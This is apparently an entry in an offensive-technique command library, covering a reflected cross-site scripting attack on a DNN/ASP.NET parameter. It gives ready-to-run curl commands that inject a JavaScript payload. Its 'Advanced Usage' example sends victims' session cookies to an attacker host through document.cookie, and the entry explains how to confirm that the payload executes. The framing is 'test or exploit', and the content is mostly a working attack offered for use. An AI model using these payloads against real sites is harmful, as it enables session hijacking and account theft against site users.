---
data: >-
  curl -X POST 'https://target.com/█████/Directorate-of-Human-Resources/' -F
  'dnn$ctr5099$ViewTabs$hidCurrentTabIndex=111111111"; alert("XSS");' -F
  'submit=1'
tags:
  - xss
  - web
  - post-request
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 04ee5406-3e23-4853-8844-4d772c4cf592
created_at: '2025-12-14T03:16:13.919Z'
updated_at: '2025-12-14T03:16:13.919Z'
verified: false
validated: true
submitted: true
---
# Send Malicious XSS POST

## Command

```bash
curl -X POST 'https://target.com/█████/Directorate-of-Human-Resources/' \
  -F 'dnn$ctr5099$ViewTabs$hidCurrentTabIndex=111111111"; alert("XSS");' \
  -F 'submit=1'
```

## Description

This command sends a multipart/form-data POST request to a vulnerable DNN endpoint, injecting a JavaScript payload into the 'dnn$ctr5099$ViewTabs$hidCurrentTabIndex' parameter to trigger reflected XSS. Use it to test or exploit unsanitized input reflection in ASP.NET applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-F 'param=value'` | Adds form fields; key is the vulnerable parameter with payload | Yes |
| `--cookie` | Optional: Includes session cookies for authenticated testing | No |
| `URL` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/█████/Directorate-of-Human-Resources/' \
  -F 'dnn$ctr5099$ViewTabs$hidCurrentTabIndex=111111111"; alert("XSS");' \
  -F 'submit=1'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/█████/Directorate-of-Human-Resources/' \
  -F 'dnn$ctr5099$ViewTabs$hidCurrentTabIndex=111111111"; fetch("https://attacker.com/steal?cookie="+document.cookie); a="' \
  -F 'other_field=value' \
  --cookie 'ASP.NET_SessionId=abc123'
```

## Expected Output

The command returns the server's HTML response. Look for the reflected payload in the body (e.g., <input value="111111111"; alert("XSS");"). In a browser context, this executes the JavaScript, showing an alert or sending data to the attacker.

## Related

- [[procedures/Exploit-Reflected-XSS-in-DNN-Parameter]]
